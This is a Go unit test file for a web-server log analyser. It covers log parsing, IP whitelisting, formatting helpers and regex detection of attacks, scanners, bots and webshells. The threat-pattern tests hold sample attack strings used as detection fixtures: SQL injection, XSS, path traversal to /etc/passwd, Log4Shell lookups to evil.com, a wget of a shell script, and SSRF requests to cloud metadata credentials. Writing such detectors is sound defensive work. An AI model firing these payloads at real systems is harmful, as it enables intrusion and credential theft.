package main

import (
	"net"
	"testing"
	"time"
)

// ── parseTimestamp ──

func TestParseTimestamp(t *testing.T) {
	tests := []struct {
		input string
		ok    bool
		year  int
		month time.Month
		day   int
		hour  int
	}{
		{"10/Mar/2026:08:18:55 +0100", true, 2026, time.March, 10, 8},
		{"01/Jan/2025:00:00:00 +0000", true, 2025, time.January, 1, 0},
		{"31/Dec/2024:23:59:59 +0200", true, 2024, time.December, 31, 23},
		{"short", false, 0, 0, 0, 0},
		{"10/Xyz/2026:08:18:55 +0100", false, 0, 0, 0, 0}, // bad month
		{"", false, 0, 0, 0, 0},
	}
	for _, tc := range tests {
		ts, ok := parseTimestamp(tc.input)
		if ok != tc.ok {
			t.Errorf("parseTimestamp(%q) ok=%v, want %v", tc.input, ok, tc.ok)
			continue
		}
		if ok {
			if ts.Year() != tc.year || ts.Month() != tc.month || ts.Day() != tc.day || ts.Hour() != tc.hour {
				t.Errorf("parseTimestamp(%q) = %v, want %d/%v/%d %d:xx", tc.input, ts, tc.year, tc.month, tc.day, tc.hour)
			}
		}
	}
}

// ── computeCutoff ──

func TestComputeCutoff(t *testing.T) {
	now := time.Now()

	t.Run("minutes", func(t *testing.T) {
		cutoff, ok := computeCutoff("30m")
		if !ok {
			t.Fatal("expected ok")
		}
		diff := now.Sub(cutoff)
		if diff < 29*time.Minute || diff > 31*time.Minute {
			t.Errorf("30m cutoff diff=%v, want ~30m", diff)
		}
	})

	t.Run("hours", func(t *testing.T) {
		cutoff, ok := computeCutoff("2h")
		if !ok {
			t.Fatal("expected ok")
		}
		diff := now.Sub(cutoff)
		if diff < 119*time.Minute || diff > 121*time.Minute {
			t.Errorf("2h cutoff diff=%v, want ~2h", diff)
		}
	})

	t.Run("weeks", func(t *testing.T) {
		cutoff, ok := computeCutoff("1w")
		if !ok {
			t.Fatal("expected ok")
		}
		diff := now.Sub(cutoff)
		if diff < 6*24*time.Hour+23*time.Hour || diff > 7*24*time.Hour+1*time.Hour {
			t.Errorf("1w cutoff diff=%v, want ~7d", diff)
		}
	})

	t.Run("date", func(t *testing.T) {
		cutoff, ok := computeCutoff("2026-01-15")
		if !ok {
			t.Fatal("expected ok")
		}
		if cutoff.Year() != 2026 || cutoff.Month() != time.January || cutoff.Day() != 15 {
			t.Errorf("date cutoff = %v, want 2026-01-15", cutoff)
		}
	})

	t.Run("invalid", func(t *testing.T) {
		_, ok := computeCutoff("xyz")
		if ok {
			t.Error("expected not ok for invalid format")
		}
	})
}

// ── percentile ──

func TestPercentile(t *testing.T) {
	tests := []struct {
		name   string
		sorted []int
		p      float64
		want   int
	}{
		{"empty", nil, 0.5, 0},
		{"single", []int{42}, 0.5, 42},
		{"p50", []int{1, 2, 3, 4, 5}, 0.5, 3},
		{"p0", []int{1, 2, 3, 4, 5}, 0.0, 1},
		{"p99", []int{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}, 0.99, 9},
		{"p100 clamped", []int{1, 2, 3}, 1.0, 3},
		{"over 1.0 clamped", []int{1, 2, 3}, 1.5, 3},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := percentile(tc.sorted, tc.p)
			if got != tc.want {
				t.Errorf("percentile(%v, %v) = %d, want %d", tc.sorted, tc.p, got, tc.want)
			}
		})
	}
}

// ── isPrefixWhitelisted (CIDR-based) ──

func TestIsPrefixWhitelisted(t *testing.T) {
	parseNet := func(cidr string) net.IPNet {
		_, n, _ := net.ParseCIDR(cidr)
		return *n
	}

	tests := []struct {
		name   string
		prefix string
		nets   []net.IPNet
		want   bool
	}{
		{"exact /24 match", "5.39", []net.IPNet{parseNet("5.39.38.0/24")}, true},
		{"broader /8 contains prefix", "5.39", []net.IPNet{parseNet("5.0.0.0/8")}, true},
		{"no match", "10.0", []net.IPNet{parseNet("5.39.38.0/24")}, false},
		{"different prefix same first octet", "5.22", []net.IPNet{parseNet("5.39.38.0/24")}, false},
		{"multiple nets one matches", "192.168", []net.IPNet{
			parseNet("10.0.0.0/8"),
			parseNet("192.168.0.0/16"),
		}, true},
		{"empty whitelist", "5.39", nil, false},
		{"invalid prefix", "abc", nil, false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := isPrefixWhitelisted(tc.prefix, tc.nets)
			if got != tc.want {
				t.Errorf("isPrefixWhitelisted(%q) = %v, want %v", tc.prefix, got, tc.want)
			}
		})
	}
}

// ── isWhitelisted ──

func TestIsWhitelisted(t *testing.T) {
	parseNet := func(cidr string) net.IPNet {
		_, n, _ := net.ParseCIDR(cidr)
		return *n
	}
	nets := []net.IPNet{
		parseNet("5.39.38.0/24"),
		parseNet("10.0.0.0/8"),
	}

	tests := []struct {
		ip   string
		want bool
	}{
		{"5.39.38.1", true},
		{"5.39.38.255", true},
		{"5.39.39.1", false},
		{"10.1.2.3", true},
		{"192.168.1.1", false},
		{"invalid", false},
	}
	for _, tc := range tests {
		t.Run(tc.ip, func(t *testing.T) {
			got := isWhitelisted(tc.ip, nets)
			if got != tc.want {
				t.Errorf("isWhitelisted(%q) = %v, want %v", tc.ip, got, tc.want)
			}
		})
	}
}

// ── fmtComma ──

func TestFmtComma(t *testing.T) {
	tests := []struct {
		input int
		want  string
	}{
		{0, "0"},
		{42, "42"},
		{999, "999"},
		{1000, "1,000"},
		{1234567, "1,234,567"},
		{-5, "-5"},
	}
	for _, tc := range tests {
		got := fmtComma(tc.input)
		if got != tc.want {
			t.Errorf("fmtComma(%d) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

// ── fmtSize ──

func TestFmtSize(t *testing.T) {
	tests := []struct {
		input int64
		want  string
	}{
		{0, "0o"},
		{512, "512o"},
		{1024, "1.0K"},
		{1048576, "1.0M"},
		{1073741824, "1.0G"},
	}
	for _, tc := range tests {
		got := fmtSize(tc.input)
		if got != tc.want {
			t.Errorf("fmtSize(%d) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

// ── Threat patterns ──

func TestThreatPatterns(t *testing.T) {
	tests := []struct {
		name    string
		uri     string
		threat  string
		matched bool
	}{
		// SQL injection
		{"sql union select", "/page?id=1 UNION SELECT 1,2,3--", "SQL", true},
		{"sql sleep", "/page?id=sleep(5)", "SQL", true},
		{"sql benchmark", "/page?id=benchmark(1000,MD5('test'))", "SQL", true},
		{"sql information_schema", "/page?id=1 AND (SELECT * FROM information_schema.tables)", "SQL", true},
		{"sql clean", "/products?category=union", "SQL", false}, // "union" alone, no "select"

		// XSS
		{"xss script tag", "/page?q=<script>alert(1)</script>", "XSS", true},
		{"xss encoded", "/page?q=%3cscript%3ealert(1)", "XSS", true},
		{"xss onerror", "/page?q=onerror=alert(1)", "XSS", true},
		{"xss clean", "/page?q=javascript", "XSS", false}, // "javascript" alone isn't enough

		// Path traversal
		{"traversal dotdot", "/../../etc/passwd", "TRAVERSAL", true},
		{"traversal encoded", "/%2e%2e/%2e%2e/etc/passwd", "TRAVERSAL", true},
		{"traversal proc", "/../../proc/self/environ", "TRAVERSAL", true},
		{"traversal clean", "/path/to/file", "TRAVERSAL", false},

		// WordPress
		{"wp login", "/wp-login.php", "WP", true},
		{"wp xmlrpc", "/xmlrpc.php", "WP", true},
		{"wp config", "/wp-config.php", "WP", true},
		{"wp clean", "/wordpress-article", "WP", false},

		// Sensitive files
		{"sensitive env", "/.env", "SENSITIVE", true},
		{"sensitive env dot", "/.env.backup", "SENSITIVE", true},
		{"sensitive git", "/.git/config", "SENSITIVE", true},
		{"sensitive htaccess", "/.htaccess", "SENSITIVE", true},
		{"sensitive phpinfo", "/phpinfo.php", "SENSITIVE", true},

		// Log4Shell
		{"log4shell jndi", "/page?x=${jndi:ldap://evil.com/x}", "LOG4SHELL", true},
		{"log4shell encoded", "/page?x=%24%7bjndi:ldap://evil.com%7d", "LOG4SHELL", true},
		{"log4shell lower", "/page?x=${lower:j}ndi", "LOG4SHELL", true},
		{"log4shell env", "/page?x=${env:AWS_SECRET}", "LOG4SHELL", true},
		{"log4shell clean", "/page?x=jndi", "LOG4SHELL", false},

		// Command injection
		{"cmdi cat", "/page?x=;cat /etc/passwd", "CMDI", true},
		{"cmdi wget", "/page?x=;wget http://evil.com/shell.sh", "CMDI", true},
		{"cmdi encoded", "/page?x=%3bwhoami", "CMDI", true},
		{"cmdi clean", "/page?x=hello;world", "CMDI", false}, // no shell command after ;

		// SSRF
		{"ssrf localhost", "/proxy?url=http://127.0.0.1:8080/admin", "SSRF", true},
		{"ssrf metadata", "/proxy?url=http://169.254.169.254/latest/meta-data", "SSRF", true},
		{"ssrf internal", "/proxy?url=http://192.168.1.1:3306/", "SSRF", true},
		{"ssrf cloud meta", "/latest/meta-data/iam/security-credentials", "SSRF", true},
		{"ssrf clean", "/page?url=http://example.com", "SSRF", false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			matched := false
			for _, tp := range threatPatterns {
				if tp.Name != tc.threat {
					continue
				}
				if tp.Re.MatchString(tc.uri) {
					matched = true
				}
			}
			if matched != tc.matched {
				t.Errorf("pattern %s on %q: got %v, want %v", tc.threat, tc.uri, matched, tc.matched)
			}
		})
	}
}

// ── Scanner detection ──

func TestScannerDetection(t *testing.T) {
	tests := []struct {
		ua      string
		scanner bool
	}{
		{"Nikto/2.1.6", true},
		{"sqlmap/1.5", true},
		{"Mozilla/5.0 (compatible; Googlebot/2.1)", false},
		{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", false},
		{"nuclei - Open-source project", true},
	}
	for _, tc := range tests {
		got := scannerRE.MatchString(tc.ua)
		if got != tc.scanner {
			t.Errorf("scannerRE(%q) = %v, want %v", tc.ua, got, tc.scanner)
		}
	}
}

// ── Bot detection ──

func TestBotDetection(t *testing.T) {
	tests := []struct {
		ua  string
		bot bool
	}{
		{"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", true},
		{"Mozilla/5.0 (compatible; bingbot/2.0)", true},
		{"Semrush/1.0", true},
		{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", false},
		{"curl/7.68.0", false},
	}
	for _, tc := range tests {
		got := botRE.MatchString(tc.ua)
		if got != tc.bot {
			t.Errorf("botRE(%q) = %v, want %v", tc.ua, got, tc.bot)
		}
	}
}

// ── Log regex ──

func TestLogRegex(t *testing.T) {
	t.Run("standard combined", func(t *testing.T) {
		line := `1.2.3.4 - - [10/Mar/2026:08:18:55 +0100] "GET /index.html HTTP/1.1" 200 1234 "https://example.com" "Mozilla/5.0"`
		m := logRE.FindStringSubmatch(line)
		if m == nil {
			t.Fatal("logRE did not match")
		}
		if m[1] != "1.2.3.4" {
			t.Errorf("IP = %q, want 1.2.3.4", m[1])
		}
		if m[3] != "GET" {
			t.Errorf("method = %q, want GET", m[3])
		}
		if m[4] != "/index.html" {
			t.Errorf("URI = %q, want /index.html", m[4])
		}
		if m[5] != "200" {
			t.Errorf("status = %q, want 200", m[5])
		}
		if m[8] != "Mozilla/5.0" {
			t.Errorf("UA = %q, want Mozilla/5.0", m[8])
		}
	})

	t.Run("vhost combined", func(t *testing.T) {
		line := `example.com:443 1.2.3.4 - - [10/Mar/2026:08:18:55 +0100] "POST /api/data HTTP/1.1" 201 567 "-" "curl/7.68.0"`
		m := vhostLogRE.FindStringSubmatch(line)
		if m == nil {
			t.Fatal("vhostLogRE did not match")
		}
		if m[1] != "example.com" {
			t.Errorf("vhost = %q, want example.com", m[1])
		}
		if m[2] != "1.2.3.4" {
			t.Errorf("IP = %q, want 1.2.3.4", m[2])
		}
		if m[4] != "POST" {
			t.Errorf("method = %q, want POST", m[4])
		}
		if m[6] != "201" {
			t.Errorf("status = %q, want 201", m[6])
		}
	})

	t.Run("malformed line", func(t *testing.T) {
		line := `this is not a log line`
		if logRE.MatchString(line) {
			t.Error("logRE should not match malformed line")
		}
	})
}

// ── Webshell detection ──

func TestWebshellDetection(t *testing.T) {
	tests := []struct {
		uri     string
		matched bool
	}{
		{"/c99.php", true},
		{"/wso.php", true},
		{"/adminer.php", true},
		{"/shell.php", true},
		{"/index.php", false},
		{"/wp-login.php", false},
	}
	for _, tc := range tests {
		got := webshellRE.MatchString(tc.uri)
		if got != tc.matched {
			t.Errorf("webshellRE(%q) = %v, want %v", tc.uri, got, tc.matched)
		}
	}
}

// ── Malformed URL detection ──

func TestMalformedURLDetection(t *testing.T) {
	tests := []struct {
		uri     string
		matched bool
	}{
		{"/example.com/wp-content/uploads/image.jpg", true},
		{"/www.google.com/search?q=test", true},
		{"/cdn.example.io/static/style.css", true},
		{"/normal/path/to/page", false},
		{"/api/v1/users", false},
	}
	for _, tc := range tests {
		got := malformedURLRE.MatchString(tc.uri)
		if got != tc.matched {
			t.Errorf("malformedURLRE(%q) = %v, want %v", tc.uri, got, tc.matched)
		}
	}
}

// ── ipScore ──

func TestIPScore(t *testing.T) {
	data := &ParseData{
		IPCounts:  map[string]int{"1.2.3.4": 100, "5.6.7.8": 1000},
		IPThreats: map[string]map[string]bool{"1.2.3.4": {"SQL": true, "XSS": true}},
		ThreatIPs: map[string]map[string]int{
			"SQL": {"1.2.3.4": 5},
			"XSS": {"1.2.3.4": 3},
		},
		EmptyUAIPs: map[string]int{},
		IPClasses:  map[string]map[string]bool{},
	}
	cfg := Cfg{"suspect_threshold": 500}

	score := ipScore("1.2.3.4", data, cfg)
	// SQL: 10 * 5 = 50, XSS: 10 * 3 = 30 → 80
	if score != 80 {
		t.Errorf("ipScore(1.2.3.4) = %d, want 80", score)
	}

	// IP with high volume but no threats
	score2 := ipScore("5.6.7.8", data, cfg)
	// (1000 - 500) / 100 * 3 = 15
	if score2 != 15 {
		t.Errorf("ipScore(5.6.7.8) = %d, want 15", score2)
	}
}

// ── UA classification ──

func TestUAClassification(t *testing.T) {
	tests := []struct {
		ua    string
		class string
	}{
		{"PayZen-client/1.0", "PAYMENT"},
		{"Uptime-Kuma/1.0", "MONITORING"},
		{"Mozilla/5.0 (compatible; Googlebot/2.1)", "LEGIT_BOT"},
		{"Semrush/1.0", "SEO"},
		{"GPTBot/1.0", "AI_BOT"},
		{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", ""},
	}
	for _, tc := range tests {
		t.Run(tc.ua, func(t *testing.T) {
			var got string
			for _, cls := range uaClasses {
				if cls.Re.MatchString(tc.ua) {
					got = cls.Name
					break
				}
			}
			if got != tc.class {
				t.Errorf("UA class(%q) = %q, want %q", tc.ua, got, tc.class)
			}
		})
	}
}

// ── topN sorting ──

func TestTopN(t *testing.T) {
	m := map[string]int{"a": 5, "b": 10, "c": 3, "d": 8}

	items := topN(m, 2)
	if len(items) != 2 {
		t.Fatalf("topN(2) returned %d items", len(items))
	}
	if items[0].Key != "b" || items[0].Val != 10 {
		t.Errorf("topN[0] = %v, want {b,10}", items[0])
	}
	if items[1].Key != "d" || items[1].Val != 8 {
		t.Errorf("topN[1] = %v, want {d,8}", items[1])
	}

	// n=0 returns all
	all := topN(m, 0)
	if len(all) != 4 {
		t.Errorf("topN(0) returned %d items, want 4", len(all))
	}
}

// ── fmtKey truncation ──

func TestFmtKey(t *testing.T) {
	if got := fmtKey("short", 10); got != "short" {
		t.Errorf("fmtKey short = %q", got)
	}
	if got := fmtKey("this is a very long string", 10); len([]rune(got)) != 10 {
		t.Errorf("fmtKey long = %q, len=%d, want 10", got, len([]rune(got)))
	}
}

// ── Login URI detection ──

func TestLoginURIDetection(t *testing.T) {
	tests := []struct {
		uri     string
		matched bool
	}{
		{"/login", true},
		{"/user/login", true},
		{"/wp-login.php", true},
		{"/admin/login", true},
		{"/signin", true},
		{"/auth/callback", true},
		{"/products", false},
		{"/login-page-info", true}, // prefix match is OK
		{"/api/v1/data", false},
	}
	for _, tc := range tests {
		got := loginURIRE.MatchString(tc.uri)
		if got != tc.matched {
			t.Errorf("loginURIRE(%q) = %v, want %v", tc.uri, got, tc.matched)
		}
	}
}

// ── fmtPct ──

func TestFmtPct(t *testing.T) {
	if got := fmtPct(50, 100); got != " 50.0%" {
		t.Errorf("fmtPct(50,100) = %q", got)
	}
	if got := fmtPct(0, 0); got != "" {
		t.Errorf("fmtPct(0,0) = %q, want empty", got)
	}
}
